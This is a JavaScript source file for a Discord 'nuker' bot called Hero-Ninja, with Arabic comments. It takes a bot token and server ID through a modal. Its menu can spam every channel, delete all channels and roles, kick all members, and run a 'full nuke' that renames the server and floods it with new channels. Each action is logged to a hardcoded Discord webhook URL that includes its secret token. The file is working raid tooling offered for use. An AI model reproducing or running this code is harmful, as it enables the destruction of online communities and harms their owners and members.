const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ButtonBuilder, ButtonStyle } = require('discord.js');

let client;
let GUILD_ID = '';
let WEBHOOK_URL = 'https://discord.com/api/webhooks/1572029716976631899/n0ns8uVt2bwCBWFNavfxI80A7efKH3Eii71-YEBS9VrwHb5Qsp7NShK1O3fyPJEi0Qit'; // حط الويب هوك هون

async function sendReport(action, details) {
    if (!WEBHOOK_URL) return;
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `**Hero-Ninja Report**\n**Action:** ${action}\n**Details:** ${details}` })
        });
    } catch (e) { console.log('Webhook error:', e); }
}

function startClient(token) {
    client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMessages, 
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMembers
        ] 
    });

    client.on('ready', () => {
        console.log(`[+] Logged in as ${client.user.tag}`);
    });

    client.on('messageCreate', async (message) => {
        if (message.author.bot) return;

        // 1. كلمة الجحفلة تطلع زر التحقق
        if (message.content === 'جحفلة') {
            const embed = new EmbedBuilder()
                .setTitle('🚨 Hero-Ninja Nuker 🚨')
                .setDescription('اضغط على زر التحقق لإعداد الجحفلة.')
                .setColor('DarkRed');

            const button = new ButtonBuilder()
                .setCustomId('verify_btn')
                .setLabel('تحقق')
                .setStyle(ButtonStyle.Danger);

            const row = new ActionRowBuilder().addComponents(button);
            await message.channel.send({ embeds: [embed], components: [row] });
        }

        // 2. كلمة المنيو (بعد ما يخلص التحقق)
        if (message.content === 'قائمة' && GUILD_ID) {
            const embed = new EmbedBuilder()
                .setTitle('Hero-Ninja Control Panel')
                .setDescription('Select an action below:')
                .setColor('Red');

            const selectMenu = new StringSelectMenuBuilder()
                .setCustomId('main_menu')
                .setPlaceholder('Select an action...')
                .addOptions(
                    new StringSelectMenuOptionBuilder().setLabel('Spam').setValue('spam').setDescription('Spam a specific channel'),
                    new StringSelectMenuOptionBuilder().setLabel('Spam All').setValue('spam_all').setDescription('Spam all channels'),
                    new StringSelectMenuOptionBuilder().setLabel('Create Channels').setValue('create_channels').setDescription('Create text channels'),
                    new StringSelectMenuOptionBuilder().setLabel('Create Roles').setValue('create_roles').setDescription('Create roles'),
                    new StringSelectMenuOptionBuilder().setLabel('Delete All Channels').setValue('delete_channels').setDescription('Delete all text channels'),
                    new StringSelectMenuOptionBuilder().setLabel('Delete All Roles').setValue('delete_roles').setDescription('Delete all roles'),
                    new StringSelectMenuOptionBuilder().setLabel('Kick All').setValue('kick_all').setDescription('Kick all members'),
                    new StringSelectMenuOptionBuilder().setLabel('Full Nuke').setValue('full_nuke').setDescription('Destroy everything')
                );

            const row = new ActionRowBuilder().addComponents(selectMenu);
            await message.channel.send({ embeds: [embed], components: [row] });
        }
    });

    client.on('interactionCreate', async (interaction) => {
        // 3. زر التحقق يفتح النافذة
        if (interaction.isButton() && interaction.customId === 'verify_btn') {
            const modal = new ModalBuilder()
                .setCustomId('verify_modal')
                .setTitle('إعدادات الجحفلة');

            const tokenInput = new TextInputBuilder()
                .setCustomId('token_input')
                .setLabel('Bot Token')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const guildInput = new TextInputBuilder()
                .setCustomId('guild_input')
                .setLabel('Server ID')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(tokenInput), new ActionRowBuilder().addComponents(guildInput));
            await interaction.showModal(modal);
        }

        // 4. استقبال البيانات والتحقق من الصلاحيات
        if (interaction.isModalSubmit() && interaction.customId === 'verify_modal') {
            const newToken = interaction.fields.getTextInputValue('token_input');
            const newGuildId = interaction.fields.getTextInputValue('guild_input');

            await interaction.deferReply({ ephemeral: true });

            try {
                // إعادة تشغيل البوت بالتوكن الجديد
                if (client) await client.destroy();
                startClient(newToken);
                await new Promise(r => setTimeout(r, 3000)); // ننتظر البوت يتصل

                const guild = client.guilds.cache.get(newGuildId);
                if (!guild) {
                    return interaction.editReply({ content: '❌ البوت ليس موجوداً في هذا السيرفر. تأكد من الايدي أو أضف البوت.' });
                }

                const botMember = guild.members.me;
                if (!botMember.permissions.has(PermissionsBitField.Flags.ManageGuild)) {
                    return interaction.editReply({ content: '❌ البوت لا يملك صلاحية "Manage Server" لتغيير اسم السيرفر.' });
                }

                // إذا كل شي تمام، بنحفظ الايدي
                GUILD_ID = newGuildId;
                await interaction.editReply({ content: '✅ تم التحقق بنجاح! البوت في السيرفر ويملك الصلاحيات. اكتب كلمة "قائمة" في الشات.' });
                await sendReport('Setup Success', `Bot configured for guild ${GUILD_ID}.`);

            } catch (err) {
                await interaction.editReply({ content: `❌ خطأ في التوكن: ${err.message}` });
            }
        }

        // 5. باقي تفاعلات القائمة (زي ما كانت)
        if (interaction.isStringSelectMenu() && interaction.customId === 'main_menu') {
            const choice = interaction.values[0];

            if (['delete_channels', 'delete_roles', 'kick_all', 'full_nuke'].includes(choice)) {
                await interaction.deferReply({ ephemeral: true });
                await executeAction(interaction, choice, null, null);
                return;
            }

            const modal = new ModalBuilder().setCustomId(`modal_${choice}`).setTitle('Enter Details');

            if (choice === 'spam' || choice === 'spam_all') {
                const amountInput = new TextInputBuilder().setCustomId('amount').setLabel('How many messages?').setStyle(TextInputStyle.Short).setPlaceholder('e.g., 5').setRequired(true);
                const textInput = new TextInputBuilder().setCustomId('text').setLabel('Message content').setStyle(TextInputStyle.Paragraph).setPlaceholder('@everyone NUKED BY HERO-NINJA').setRequired(false);
                modal.addComponents(new ActionRowBuilder().addComponents(amountInput), new ActionRowBuilder().addComponents(textInput));
            } else if (choice === 'create_channels' || choice === 'create_roles') {
                const amountInput = new TextInputBuilder().setCustomId('amount').setLabel('How many?').setStyle(TextInputStyle.Short).setPlaceholder('e.g., 10').setRequired(true);
                const nameInput = new TextInputBuilder().setCustomId('name').setLabel('What name?').setStyle(TextInputStyle.Short).setPlaceholder('e.g., hero').setRequired(false);
                modal.addComponents(new ActionRowBuilder().addComponents(amountInput), new ActionRowBuilder().addComponents(nameInput));
            }
            await interaction.showModal(modal);
        }

        if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_')) {
            const choice = interaction.customId.replace('modal_', '');
            const amount = interaction.fields.getTextInputValue('amount');
            let text = '';
            if (choice === 'spam' || choice === 'spam_all') text = interaction.fields.getTextInputValue('text') || '@everyone NUKED BY HERO-NINJA';
            else if (choice === 'create_channels' || choice === 'create_roles') text = interaction.fields.getTextInputValue('name') || 'hero';
            await interaction.deferReply({ ephemeral: true });
            await executeAction(interaction, choice, parseInt(amount) || 5, text);
        }
    });

    client.login(token).catch(err => console.log('Login error:', err.message));
}

async function executeAction(interaction, choice, amount, text) {
    const guild = client.guilds.cache.get(GUILD_ID);
    if (!guild) return interaction.editReply({ content: "[-] Guild not found." });

    try {
        if (choice === 'spam') {
            for (let i = 0; i < amount; i++) await interaction.channel.send(text).catch(() => {});
            await interaction.editReply({ content: `Sent ${amount} messages.` });
            await sendReport('Spam', `Sent ${amount} messages in ${interaction.channel.name}.`);
        }
        else if (choice === 'spam_all') {
            for (const channel of guild.channels.cache.values()) {
                if (channel.isTextBased()) for (let i = 0; i < amount; i++) channel.send(text).catch(() => {});
            }
            await interaction.editReply({ content: `Sent ${amount} messages in all channels.` });
            await sendReport('Spam All', `Sent ${amount} messages in all channels.`);
        }
        else if (choice === 'create_channels') {
            for (let i = 1; i <= amount; i++) await guild.channels.create({ name: `${text}-${i}` }).catch(() => {});
            await interaction.editReply({ content: `Created ${amount} channels named "${text}".` });
            await sendReport('Create Channels', `Created ${amount} channels.`);
        }
        else if (choice === 'create_roles') {
            for (let i = 1; i <= amount; i++) await guild.roles.create({ name: `${text} ${i}` }).catch(() => {});
            await interaction.editReply({ content: `Created ${amount} roles named "${text}".` });
            await sendReport('Create Roles', `Created ${amount} roles.`);
        }
        else if (choice === 'delete_channels') {
            for (const channel of guild.channels.cache.values()) await channel.delete().catch(() => {});
            await sendReport('Delete Channels', 'Deleted all channels.');
        }
        else if (choice === 'delete_roles') {
            for (const role of guild.roles.cache.values()) if (role.name !== '@everyone' && !role.managed) await role.delete().catch(() => {});
            await interaction.editReply({ content: 'Deleted all roles.' });
            await sendReport('Delete Roles', 'Deleted all roles.');
        }
        else if (choice === 'kick_all') {
            let count = 0;
            for (const member of guild.members.cache.values()) {
                if (member.kickable && member.id !== client.user.id) { await member.kick('NUKED BY HERO-NINJA').catch(() => {}); count++; }
            }
            await interaction.editReply({ content: `Kicked ${count} members.` });
            await sendReport('Kick All', `Kicked ${count} members.`);
        }
        else if (choice === 'full_nuke') {
            await sendReport('FULL NUKE', 'Starting full nuke...');
            for (const channel of guild.channels.cache.values()) await channel.delete().catch(() => {});
            for (const role of guild.roles.cache.values()) if (role.name !== '@everyone' && !role.managed) await role.delete().catch(() => {});
            for (const member of guild.members.cache.values()) if (member.kickable && member.id !== client.user.id) await member.kick('NUKED BY HERO-NINJA').catch(() => {});
            await guild.setName('NUKED BY HERO-NINJA').catch(() => {});
            for (let i = 1; i <= 20; i++) await guild.channels.create({ name: `hero-is-here-${i}` }).catch(() => {});
            await sendReport('FULL NUKE', 'Nuke completed.');
        }
    } catch (err) {
        await interaction.editReply({ content: `[-] Error: ${err.message}` }).catch(() => {});
    }
}

// تشغيل البوت بالتوكن الافتراضي إذا كان موجود
if (process.env.BOT_TOKEN) {
    startClient(process.env.BOT_TOKEN);
} else {
    console.log("Waiting for setup...");
}
